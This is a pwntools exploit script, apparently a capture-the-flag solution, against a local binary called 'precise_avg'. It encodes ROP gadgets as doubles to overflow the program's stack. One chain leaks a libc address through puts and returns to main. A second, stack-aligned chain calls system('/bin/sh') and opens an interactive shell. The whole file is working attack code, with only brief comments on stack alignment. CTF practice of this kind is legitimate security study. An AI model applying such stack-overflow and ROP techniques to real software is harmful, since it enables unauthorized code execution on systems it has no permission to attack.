from pwn import *

from struct import pack, unpack


binname = './precise_avg'
context.binary = binname
context.terminal = ['tmux', 'splitw', '-h']

elf = ELF(binname)
libc = elf.libc


gdbscript='''
pwn
# number of numbers
# b *0x400846
# ret from main
b *0x400958
'''
# io = gdb.debug([binname], aslr=False, gdbscript=gdbscript)
io = process(binname)


# 0x00000000004009c3 : pop rdi ; ret
# 0x00000000004009c1 : pop rsi ; pop r15 ; ret
pop_rdi = 0x4009c3
pop_rsi_r15 = 0x4009c1
addr_puts_plt = 0x400630
addr_puts_got = 0x600fb0
addr_fini_array = 0x600dc8
addr_scanf_plt = 0x400660
addr_exit_plt = 0x400668



def p_double(x):
    tmp = p64(x)
    return unpack("<d", tmp)[0]


def u_double(x):
    tmp = pack("<d", x)
    return u64(tmp)

io.recvuntil("Number of values: ")
io.sendline("127")

for _ in xrange(35):
    io.sendline('-')


rop = []
# puts(addr_puts_got)
rop.append(pop_rdi)
rop.append(elf.got['puts'])
rop.append(elf.plt['puts'])
rop.append(0x4007D0) # main

for word in rop:
    io.sendline(str(p_double(word)))

for _ in xrange(127 - (35 + len(rop))):
    io.sendline('-')


io.recvuntil('Res')
io.recvline()

# leak address
while True:
    data = io.recvline()
    if 'Warning' not in data:
        break

addr_libc = u64(data.rstrip().ljust(8, '\x00')) - 0x809c0
print 'addr_libc = {}'.format(hex(addr_libc))
addr_one_gadget = addr_libc + 0x4f2c5

# main again
io.recvuntil("Number of values: ")
io.sendline("127")

for _ in xrange(35):
    io.sendline('-')


print 'system',
print hex(addr_libc + libc.symbols['system'])
rop = []
# system('bin/sh')
# movaps instruction in system() requires the operand to be aligned by 16 bytes.
# with this ret rop the RSP will be aligned to 16 bytes.
# without it the RSP will not be aligned and die with SISSEGV.
rop.append(0x400958) # ret
# with this rop,   RSP  0x7fffffffdcb0 (ends with 0, i.e., aligned by 16 bytes)
# without this rop,RSP  0x7fffffffdca8 (ends with 8, i.e., not aligned by 16 bytes)


rop.append(pop_rdi)
rop.append(addr_libc + next(libc.search('/bin/sh')))
rop.append(addr_libc + libc.symbols['system'])
for word in rop:
    io.sendline("%.800f" % p_double(word))

for _ in xrange(127 - (35 + len(rop))):
    io.sendline('-')


io.interactive()
